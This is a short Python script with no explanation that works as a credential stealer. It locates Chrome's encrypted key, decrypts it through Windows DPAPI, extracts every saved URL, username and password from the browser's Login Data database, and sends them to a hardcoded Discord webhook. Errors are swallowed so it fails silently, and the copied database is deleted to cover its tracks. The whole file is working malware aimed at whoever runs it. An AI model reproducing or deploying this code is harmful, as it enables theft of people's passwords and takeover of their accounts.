import os, json, base64, sqlite3, shutil, requests
try:
    import win32crypt
    from cryptography.hazmat.primitives.ciphers.aead import AESGCM
except: pass

def get_key():
    path = os.path.join(os.environ["USERPROFILE"], "AppData", "Local", "Google", "Chrome", "User Data", "Local State")
    with open(path, "r", encoding="utf-8") as f:
        js = json.load(f)
    k = base64.b64decode(js["os_crypt"]["encrypted_key"])[5:]
    return win32crypt.CryptUnprotectData(k, None, None, None, 0)[1]

def dec(p, k):
    try:
        iv, payload = p[3:15], p[15:]
        return AESGCM(k).decrypt(iv, payload, None).decode()
    except: return ""

def main():
    wh = "https://discord.com/api/webhooks/1469874224826159238/6uZ4nai1p28JAPZFSl5HQs4U1IeaUZot-j7n__PsijGtJDA3bg2ZQHk5c92BENHE7UG9"
    db = os.path.join(os.environ["USERPROFILE"], "AppData", "Local", "Google", "Chrome", "User Data", "Default", "Login Data")
    shutil.copyfile(db, "tmp_db")
    c = sqlite3.connect("tmp_db")
    cur = c.cursor()
    cur.execute("SELECT origin_url, username_value, password_value FROM logins")
    k = get_key()
    msg = ""
    for u, user, p in cur.fetchall():
        msg += f"URL: {u}\nU: {user}\nP: {dec(p, k)}\n{'-'*10}\n"
    if msg:
        requests.post(wh, json={"content": f"🔓 **Passwords:**\n{msg[:1900]}"})
    c.close()
    os.remove("tmp_db")

if __name__ == "__main__":
    try: main()
    except: pass
